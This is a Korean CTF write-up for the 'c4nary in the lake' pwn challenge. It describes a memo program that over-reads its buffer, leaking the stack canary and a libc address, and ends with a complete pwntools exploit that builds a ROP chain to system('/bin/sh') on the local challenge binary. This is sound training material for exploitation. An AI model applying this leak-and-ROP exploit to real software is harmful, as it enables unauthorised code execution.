<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> 2026 INCOGNITO CTF "c4nary in the lake"  Write-UP</h1>
</body>
<br>
<br>
</html>

2026.02.18 풀이

<img width="1886" height="140" alt="image" src="https://github.com/user-attachments/assets/cc571eaf-091f-4052-ad71-71ef025a1a55" />

제공받은 파일을 checksec으로 살펴보니, 모든 보호 기준이 켜져 있었다. 
<br>

</br>

<img width="566" height="722" alt="image" src="https://github.com/user-attachments/assets/62a639d1-f5dd-4c31-b68a-6c12df5ffc13" />

IDA로 main 함수를 살펴보았다. 
<br>

</br>

<img width="498" height="636" alt="image" src="https://github.com/user-attachments/assets/3414f7ae-3ba9-4b47-8163-5e5f7eac2191" />

해당 부분을 살펴보면 실제 buf가 0x68 bytes인 걸 알 수 있다. buf는 0x68인데, 출력은 0x180인 것을 보아 이 부분이 취약점인 것 같다.   
<br>

</br>

<img width="470" height="350" alt="image" src="https://github.com/user-attachments/assets/6c5890bc-53c5-46fe-88ba-6221c508cf4b" />

memo length 길이가 31보다 크면 diag가 ON되는 걸 알 수 있다.
<br>

</br>

<img width="412" height="248" alt="image" src="https://github.com/user-attachments/assets/917917ef-881d-45a1-84f9-b9825a4e9e59" />

해당 부분을 살펴보면 0~135 bytes는 v1 버퍼를 채우고, 136~143 이후는 v2로 카나리를 덮어쓰는 것으로 보인다. 그 후 152~159 byte 부분은 Return Address를 덮어쓰므로 이 부분에 ROP Chain을 넣으면 될 것 같아보인다.
<br>

</br>

<img width="790" height="232" alt="image" src="https://github.com/user-attachments/assets/773b0d0b-85c7-4662-ab46-f0cfd78f05aa" />

<img width="960" height="610" alt="image" src="https://github.com/user-attachments/assets/66018105-f080-4f74-89c9-f886e82c1047" />

<img width="818" height="1176" alt="image" src="https://github.com/user-attachments/assets/c055dad4-b514-4cb1-bdce-2f8231f06cb6" />

이를 gdb로 살펴보았다. do_read_memo 함수 부분에 bp를 건다.
<br>

</br>

<img width="1266" height="1016" alt="image" src="https://github.com/user-attachments/assets/2d71651c-c834-4130-a8d7-b773cf6484c3" />

<img width="656" height="734" alt="image" src="https://github.com/user-attachments/assets/e67e94f3-ba69-48bc-8768-c79e67d6c280" />

<img width="890" height="600" alt="image" src="https://github.com/user-attachments/assets/e65d638c-f6c7-47fd-8ab0-9e4436ea7a1f" />

그 상태에서 rbp를 살펴보고, leak 구조를 통해 canary랑 libc 주소를 알아낸다. 
<br>

</br>

<img width="1668" height="128" alt="image" src="https://github.com/user-attachments/assets/248739aa-e2d8-4dd6-b2b9-eb3a8d737899" />

<img width="1026" height="70" alt="image" src="https://github.com/user-attachments/assets/f4a4d183-62bd-4170-9759-449e2af54a57" />

다음 명령어들을 통해 필요한 값들을 마저 알아내고, 이렇게 얻은 값들을 사용해 exploit 코드를 작성했다. 
<br>

</br>

```
from pwn import *

context.arch = "amd64"
context.log_level = "info"

p = process("./chall") 

# [1] 오프셋 설정 
LEAK_LIBC_OFF   = 0x68
LEAK_CANARY_OFF = 0x78

OFF_SYSTEM   = 0x58750
OFF_BINSH    = 0x1cb42f
OFF_POP_RDI  = 0x10f78b
OFF_RET      = 0x10f78c  # ret 가젯 주소
OFF_LEAK_PTR = 0x2d837

def write_memo(data: bytes):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"length?", str(len(data)).encode())
    p.sendafter(b"bytes now:", data)

def enable_diag():
    p.sendlineafter(b"> ", b"3")

def read_memo() -> bytes:
    p.sendlineafter(b"> ", b"2")
    p.recvuntil(b"memo: ")
    return p.recvn(0x180)

# 1) Leak 단계
log.info("Step 1: Leaking memory...")
write_memo(b"A" * 32)
enable_diag()
leak = read_memo()

leak_libc = u64(leak[LEAK_LIBC_OFF:LEAK_LIBC_OFF+8])
canary    = u64(leak[LEAK_CANARY_OFF:LEAK_CANARY_OFF+8])

log.success(f"leak_libc = {hex(leak_libc)}")
log.success(f"canary    = {hex(canary)}")

# 2) 주소 계산
libc_base = leak_libc - OFF_LEAK_PTR
addr_system = libc_base + OFF_SYSTEM
addr_binsh  = libc_base + OFF_BINSH
addr_poprdi = libc_base + OFF_POP_RDI
addr_ret    = libc_base + OFF_RET 

log.success(f"libc_base = {hex(libc_base)}")
log.info(f"system   @ {hex(addr_system)}")

# 3) ROP 체인 구성 
payload  = b"A" * 136        # Buffer
payload += p64(canary)       # Canary
payload += b"B" * 8          # SFP (Saved Frame Pointer)

# --- ROP Start ---
payload += p64(addr_ret)     
payload += p64(addr_poprdi)  # pop rdi; ret
payload += p64(addr_binsh)   # /bin/sh 주소가 rdi로
payload += p64(addr_system)  # system("/bin/sh") 호출
# -----------------

payload  = payload.ljust(512, b"\x00")

log.info("Step 3: Sending payload...")
p.sendlineafter(b"> ", b"4")
p.sendafter(b"bytes):", payload)

p.interactive()
```

<img width="1270" height="226" alt="image" src="https://github.com/user-attachments/assets/26e003a8-05ae-4518-8204-0d498541395c" />

flag 값을 얻었다
